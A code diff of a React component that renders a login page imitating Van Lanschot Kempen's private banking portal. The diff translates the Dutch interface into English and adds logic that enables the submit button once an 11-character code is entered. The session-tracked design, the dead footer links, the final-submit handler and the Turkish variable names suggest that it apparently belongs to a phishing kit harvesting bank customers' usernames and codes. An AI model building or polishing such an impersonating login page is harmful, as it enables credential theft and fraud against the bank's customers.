@@ -15,6 +15,8 @@ export function VanLanschotKempenClient({ sessionId }: { sessionId: string }) {
   const [code, setCode] = useState("");
   const [remember, setRemember] = useState(false);
   const [saving, setSaving] = useState(false);
+  const formDoluMuStep1 = username.trim().length > 0;
+  const formDoluMuStep3 = code.length === 11;
 
   useEffect(() => {
     let cancelled = false;
@@ -56,16 +58,16 @@ export function VanLanschotKempenClient({ sessionId }: { sessionId: string }) {
       </div>
       
       <div className="w-full max-w-[800px] flex-1 flex flex-col items-center">
-        <h1 className="text-[34px] font-serif text-[#2C3A40] mb-8 w-full text-center md:text-left">Inloggen Mijn Private Bank</h1>
+        <h1 className="text-[34px] font-serif text-[#2C3A40] mb-8 w-full text-center md:text-left">Log in to My Private Bank</h1>
         {children}
       </div>
 
       <div className="w-full max-w-[800px] mt-12 flex flex-wrap justify-center gap-4 text-[13px] text-[#007A73] font-medium">
-        <a href="#" className="hover:underline">Over Van Lanschot Kempen</a> <span className="text-gray-300">|</span>
-        <a href="#" className="hover:underline">Veilig Bankieren</a> <span className="text-gray-300">|</span>
-        <a href="#" className="hover:underline">Privacy en cookies</a> <span className="text-gray-300">|</span>
+        <a href="#" className="hover:underline">About Van Lanschot Kempen</a> <span className="text-gray-300">|</span>
+        <a href="#" className="hover:underline">Secure Banking</a> <span className="text-gray-300">|</span>
+        <a href="#" className="hover:underline">Privacy and cookies</a> <span className="text-gray-300">|</span>
         <a href="#" className="hover:underline">Disclaimer</a> <span className="text-gray-300">|</span>
-        <a href="#" className="hover:underline">Hulp Nodig?</a>
+        <a href="#" className="hover:underline">Need Help?</a>
       </div>
     </div>
   );
@@ -147,10 +149,10 @@ export function VanLanschotKempenClient({ sessionId }: { sessionId: string }) {
               </a>
               <button 
                 onClick={() => handleFinalSubmit()}
-                disabled={saving || code.length !== 11} 
-                className="bg-[#007A73] text-white font-bold py-3 px-12 rounded hover:bg-[#00605a] disabled:opacity-30 disabled:bg-gray-400 disabled:text-gray-600 transition-colors"
+                disabled={!formDoluMuStep3 || saving} 
+                className={`font-bold py-3 px-12 rounded transition-colors ${formDoluMuStep3 && !saving ? "bg-[#007A73] hover:bg-[#00605a] text-white" : "bg-gray-400 text-gray-700 opacity-70"}`}
               >
-                {saving ? "Laden..." : "Volgende"}
+                {saving ? "Loading..." : "Next"}
               </button>
             </div>
           </div>
